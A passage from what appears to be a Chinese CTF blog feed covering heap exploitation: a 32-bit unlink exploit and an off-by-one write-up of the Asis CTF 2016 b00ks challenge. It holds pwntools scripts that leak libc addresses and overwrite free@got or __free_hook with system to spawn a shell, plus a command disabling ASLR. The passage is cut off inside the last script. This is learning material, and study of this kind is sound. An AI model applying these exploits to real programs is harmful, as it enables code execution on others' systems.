number">0xc</span> <span class="token operator">+</span> <span class="token function">p32</span><span class="token punctuation">(</span>ptr<span class="token number">-0xc</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token function">p32</span><span class="token punctuation">(</span>free@got<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//            padding + chunk0_mem_ptr+chunk1_mem_ptr+....</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 上面的原理利用图：</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564061351662.png" alt="1564061351662"></p><p> 对于更多版本的利用payload是否绕过：可以通过pwntools的debug检查程序卡在哪里</p><pre class="line-numbers language-python"><code class="language-python"> context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 需要debug的地方</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 脚本ctrl+c可以再开一gdb的调试</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564061517009.png" alt="1564061517009"></p><p> 能够看出size与pre_size没有够造好。</p></li></ol><h3 id="程序演示"><a href="#程序演示" class="headerlink" title="程序演示"></a>程序演示</h3><p>下面这个binary演示了简单的unlink利用，如前面部分介绍的利用思想，这里涉及到DynELF的使用（无libc泄露libc地址）和32位的传参栈布局</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564062135895.png" alt="1564062135895"></p><p>64位涉及到寄存器传参。</p><p>详细参考：<a href="https://www.anquanke.com/post/id/85129" target="_blank" rel="noopener">https://www.anquanke.com/post/id/85129</a></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 调试pwntools脚本payload在用sendlineafter | sendafter ,关键处进行gdb.attach，多开gdb窗口进行调试</span><span class="token comment" spellcheck="true"># context.update(os='linux', arch='i386',log_level='debug')</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./heap"</span><span class="token punctuation">)</span>chunk_list <span class="token operator">=</span> <span class="token number">0x8049d60</span>free_got <span class="token operator">=</span> <span class="token number">0x8049ce8</span>flag <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">def</span> <span class="token function">leak</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">0xc</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_list<span class="token number">-0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>addr<span class="token punctuation">)</span>    <span class="token keyword">global</span> flag    <span class="token keyword">if</span> flag <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        set_chunk<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>        flag <span class="token operator">=</span> <span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        set_chunk<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">""</span>    res <span class="token operator">=</span> print_chunk<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"leaking: %#x ---> %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>addr<span class="token punctuation">,</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">add_chunk</span><span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># print p.recvuntil('5.Exit\n')</span>    <span class="token comment" spellcheck="true"># p.sendline('1')</span>    <span class="token comment" spellcheck="true"># print p.recvuntil('Input the size of chunk you want to add:')</span>    <span class="token comment" spellcheck="true"># p.sendline(str(len))</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit\n"</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'Input the size of chunk you want to add:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">set_chunk</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># p.recvuntil('5.Exit\n')</span>    <span class="token comment" spellcheck="true"># p.sendline('2')</span>    <span class="token comment" spellcheck="true"># p.recvuntil('Set chunk index:')</span>    <span class="token comment" spellcheck="true"># p.sendline(str(index))</span>    <span class="token comment" spellcheck="true"># p.recvuntil('Set chunk data:')</span>    <span class="token comment" spellcheck="true"># p.sendline(data)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit\n"</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Set chunk index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Set chunk data:"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">del_chunk</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># p.recvuntil('5.Exit\n')</span>    <span class="token comment" spellcheck="true"># p.sendline('3')</span>    <span class="token comment" spellcheck="true"># p.recvuntil('Delete chunk index:')</span>    <span class="token comment" spellcheck="true"># p.sendline(str(index))</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit\n"</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Delete chunk index:"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">print_chunk</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"5.Exit\n"</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Print chunk index:'</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'1.Add'</span><span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> resraw_input<span class="token punctuation">(</span><span class="token string">'add_chunk'</span><span class="token punctuation">)</span>add_chunk<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#0</span>add_chunk<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#1</span>add_chunk<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#2</span>add_chunk<span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#3</span>set_chunk<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#fake_chunk</span>payload <span class="token operator">=</span> <span class="token string">""</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x81</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_list<span class="token number">-0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_list<span class="token number">-0x8</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x80</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#2nd chunk </span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x80</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x88</span><span class="token punctuation">)</span>set_chunk<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token comment" spellcheck="true">###########################</span><span class="token comment" spellcheck="true"># pwndbg> parseheap</span><span class="token comment" spellcheck="true"># addr                prev                size                 status              fd                bk                </span><span class="token comment" spellcheck="true"># 0x9e04000           0x0                 0x88                 Freed                0x0              0x89</span><span class="token comment" spellcheck="true"># 0x9e04088           0x80                0x88                 Used                None              None</span><span class="token comment" spellcheck="true"># 0x9e04110           0x0                 0x88                 Used                None              None</span><span class="token comment" spellcheck="true"># 0x9e04198           0x0                 0x88                 Used                None              None</span><span class="token comment" spellcheck="true"># pwndbg> x/10wx 0x9e04000</span><span class="token comment" spellcheck="true"># 0x9e04000:    0x00000000    0x00000089    0x00000000    0x00000089</span><span class="token comment" spellcheck="true"># 0x9e04010:    0x08049d54    0x08049d58    0x41414141    0x41414141</span><span class="token comment" spellcheck="true"># 0x9e04020:    0x41414141    0x41414141</span><span class="token comment" spellcheck="true"># pwndbg> x/10wx 0x8049D60</span><span class="token comment" spellcheck="true"># 0x8049d60:    0x09e04008    0x09e04090    0x09e04118    0x09e041a0</span><span class="token comment" spellcheck="true"># 0x8049d70:    0x00000000    0x00000000    0x00000000    0x00000000</span><span class="token comment" spellcheck="true"># 0x8049d80:    0x00000000    0x00000000</span><span class="token comment" spellcheck="true"># pwndbg> </span><span class="token comment" spellcheck="true">##########################</span><span class="token comment" spellcheck="true"># pwnlib.gdb.attach(p)</span><span class="token comment" spellcheck="true">#get the pointer</span>del_chunk<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>set_chunk<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8049d54</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0x8048420</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 修改的是全局记录的指针数组，即buf[1]已经变为了free@plt</span>raw_input<span class="token punctuation">(</span><span class="token string">'leak'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#leak system_addr,通过DynELF，free@plt来泄露system的地址</span>pwn_elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./heap'</span><span class="token punctuation">)</span>d <span class="token operator">=</span> DynELF<span class="token punctuation">(</span>leak<span class="token punctuation">,</span> elf<span class="token operator">=</span>pwn_elf<span class="token punctuation">)</span>sys_addr <span class="token operator">=</span> d<span class="token punctuation">.</span>lookup<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"system addr: %#x"</span> <span class="token operator">%</span> sys_addr<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token string">'edit free@got'</span><span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> <span class="token number">12</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>chunk_list<span class="token number">-0xc</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span>set_chunk<span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>set_chunk<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">,</span> p32<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 把free@plt覆写为free@got的内容，因为前面已经运行了free,got记录了真正的free的地址</span>del_chunk<span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>程序流程</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1564061750675.png" alt="1564061750675"></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> heap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>off by one 利用原理</title>
      <link href="/2019/07/24/off-by-one-li-yong-yuan-li/"/>
      <url>/2019/07/24/off-by-one-li-yong-yuan-li/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用电脑浏览效果更佳！</p></blockquote><h3 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h3><p>​    记录分析off-by-one(off-by-null，只是覆盖一字节内容不同而已)的漏洞利用原理，使得萌新如我在看ctf-wiki上的pwn的glibc利用手法能够深入的了解off-by-one的原理。此处挑选的是上面的例一：Asis CTF 2016 b00ks进行详细的介绍，说实话，把这道题弄懂确实费了我好多时间，（多少次在放弃heap pwn与断断续续的不甘心中把这道题看完了，一些分析过程中也加深了对Linux下从ELF文件到加载到内存的映射结构的理解，包括动态链接与映射，内存页保护，malloc与mmap的调用分配内存大小的区别 ）。不禁想起俞敏洪在演讲中提到的，愚笨的我只能比其他人一遍又一遍的学，终究我也能够学会。</p><a id="more"></a><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><h4 id="堆内存的pwn利用本质"><a href="#堆内存的pwn利用本质" class="headerlink" title="堆内存的pwn利用本质"></a>堆内存的pwn利用本质</h4><p>​    通过伪造内存，在内存控制字段中可以伪造fake_pointer指针，获得指向libc.so映射的地址（如修改 <code>__malloc_hook</code> 与 <code>__free_hook</code>内容为one_gadget或者system(“/bin/bs”)等开shell函数），或者获得指向got表项内存对got表重定位函数地址进行修改。进而控制程序的流程。</p><h4 id="安全机制"><a href="#安全机制" class="headerlink" title="安全机制"></a>安全机制</h4><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563935962453.png" alt="1563935962453"></p><p>​    Full RELRO意味着got表项的覆写无法实现对got表的覆写。但可以通过修改 <code>__free_hook</code> 或者 <code>__malloc_hook</code> 进行利用。</p><h4 id="定位程序漏洞"><a href="#定位程序漏洞" class="headerlink" title="定位程序漏洞"></a>定位程序漏洞</h4><p>​    自实现的read函数存在off-by-one漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563936688091.png" alt="1563936688091"></p><h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><p><strong>main程序流程</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563936977389.png" alt="1563936977389"></p><p><strong>create_book()的heap malloc分配流程</strong></p><p>book_name = malloc(v1);</p><p>book_description = malloc(v1);</p><p>v3 = malloc(0x20uLL);//malloc_book_struct，记录name,description的指针</p><p><strong>book_struct（记录book信息）结构体内存</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563936886840.png" alt="1563936886840"></p><p>综上一次create_book的内存结构（从上-下：低地址-高地址内存）低内存覆写高内存内容</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563937231525.png" alt="1563937231525"></p><p><strong>内存覆写（off-by-one）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563937413020.png" alt="1563937413020"></p><p>关闭地址随机（PIE）: </p><pre class="line-numbers language-shell"><code class="language-shell">$ cat /proc/sys/kernel/randomize_va_space # echo 0 > /proc/sys/kernel/randomize_va_space<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>从ELF文件加载（映射）到虚拟内存的地址即可通过laod_image_base+offset计算得出真正的地址。如此处.data的全局变量：</p><p>内存映射结构：</p><pre class="line-numbers language-shell"><code class="language-shell"># cat /proc/pid/mapspwndbg>vmmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563938098964.png" alt="1563938098964"></p><p>可以知道：<br>镜像映射基址为：0x555555554000</p><p>libc映射基址为：（动态连接）0x7ffff7a0d000</p><p>global_book_array: 0x555555554000 + 0x202060</p><p>global_author_name:0x555555554000 + 0x202040</p><p>即可以global_author_name 可以向高地址(.data段)多写一字节\x00，通过此可以泄露book1_struct_address (create_book1覆盖了name的字符串结束\x00，通过print(author_name即可泄露),book2_struct_address (由于book2d的book_name,book_descrtiption都大于malloc的上限，即通过mmap进行分配，如上图分析的malloc分配流程，此时heap段记录book2的信息只有malloc(0x20) book_struct,即可以通过已知的book1_struct_address + sizeof(book1_struct)即可计算保存book2信息的结构体在heap的地址，即book1_struct_address+0x30)</p><pre class="line-numbers language-python"><code class="language-python">init_author_name<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token string">"book1_name"</span><span class="token punctuation">,</span><span class="token number">140</span><span class="token punctuation">,</span><span class="token string">"create book1"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol><li><p>新建book1覆盖32bit author_name结尾\x00，通过print_book泄露book1_struct地址，进而计算book2_struct</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563946078340.png" alt="1563946078340"></p></li><li><p>此时堆的结构</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563946228818.png" alt="1563946228818"></p></li><li><p>通过print_book泄露book1_struct地址，计算book2_struct地址</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token comment" spellcheck="true"># leak book1_struct_address</span> print_book_info<span class="token punctuation">(</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span> tmp <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\x0a"</span><span class="token punctuation">)</span> book1_struct_address <span class="token operator">=</span> u64<span class="token punctuation">(</span>tmp<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> book2_struct_address <span class="token operator">=</span> book1_struct_address <span class="token operator">+</span> <span class="token number">0x30</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>覆盖修改global_author_name,off_by_null覆盖global_book_array的book1_struct_address     0x0000555555758160 为     0x0000555555758100，恰好落在book1的description域内（这也是为什么要140字节的description,使得我们可以伪造一个book1的内存块）</p><pre class="line-numbers language-python"><code class="language-python"> <span class="token comment" spellcheck="true"># create book2,name和description都通过mmap分配，通过获取book2_struct的name指针域获取到libc的地址</span> create_book<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># fake book1_struct</span> payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">0x40</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>book2_struct_address<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>book2_struct_address<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x8c</span><span class="token punctuation">)</span> edit_book_description<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> change_author_name<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">32</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> 可以看到在create_book2的时候，由于name，description都有mmap分配，堆的内存分布</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563948500820.png" alt="1563948500820"></p><p> vmmap的内存</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563948765016.png" alt="1563948765016"></p><p> 通过change_author_name的off-by-null伪造的fake-book1</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563949276135.png" alt="1563949276135"></p></li></ol><h4 id="通过book1-description伪造book1-struct控制写任意内存"><a href="#通过book1-description伪造book1-struct控制写任意内存" class="headerlink" title="通过book1_description伪造book1_struct控制写任意内存"></a>通过book1_description伪造book1_struct控制写任意内存</h4><h5 id="泄露libc基址（使得开启PIE也能继续利用）"><a href="#泄露libc基址（使得开启PIE也能继续利用）" class="headerlink" title="泄露libc基址（使得开启PIE也能继续利用）"></a>泄露libc基址（使得开启PIE也能继续利用）</h5><p>通过上面内存映射分析与global_author_name的off-by-one漏洞分析中知道，可以通过后create_book1(往global_book_array全局数组)覆盖global_author_name的\x00泄露book_struct结构地址，同时也可以通过修改global_author_name再次覆盖global_book_array数组中的第一项即book1_struct结构体指针低位为\x00，即改小真实的book1_struct地址，使得落入book1_description中，通过book1_description的伪造fake_book1_struct，其中fake_book1_struct-&gt;book_name = book2_struct_bookname_ptr(book2_struct_address+8),fake_book1_struct-&gt;book_description = book2_struct_bookdescripion_ptr(book2_struct_address+16)，但他们实际的内容是mmap函数得到的地址指针，通过打印book1_struct的信息可以泄露出libc的地址（mmap的地址与libc加载的地址有一个固定的偏移）</p><h5 id="覆写-free-hook"><a href="#覆写-free-hook" class="headerlink" title="覆写__free_hook"></a>覆写__free_hook</h5><p>free(*ptr) 每一次free都会检查<code>__free_hook</code>的存在。此处通过覆写<code>__free_hook</code>为<code>system()</code>的地址，ptr为‘/bin/bash’字符串的地址，每次free(ptr)即变为了system(“/bin/bash”)，即开启一个shell</p><p>通过泄露libc基址可以知道，fake_book1_struct的book_description指针指向book2_struct的book_name域，即以该地址以高地址为其fake_book1的description的具体内容，通过修改fake_book1，即可修改book2_struct的book_name指针为”/bin/bash”指针,book2_description指针为<code>__free_hook</code>,在次通过修改book2即可将<code>__free_hook</code>修改为<code>system()</code>的地址，即可达到开shell的目的</p><ol><li><p>有上一步知道构造的fake_book1的name指针域指向book2的name域（即拿到可控任意内存指针，可以进行覆写）</p><pre class="line-numbers language-python"><code class="language-python"> edit_book_description<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 在修改book1的name_ptr指向的内存（即book2的name_ptr所存地址)为bin_sh_ptr的时候，也覆盖了book2_descripiton指针指向（关联)__free_hook</span> edit_book_description<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 接着修改上一步的_free_hook为system函数地址</span> delete_book<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 相当于system(ptr_name) = system(bin_sh_ptr)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>效果如</p><p> <img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/thonsun/images/img/1563949863902.png" alt="1563949863902"></p></li></ol><h3 id="分析流程转EXP"><a href="#分析流程转EXP" class="headerlink" title="分析流程转EXP"></a>分析流程转EXP</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token 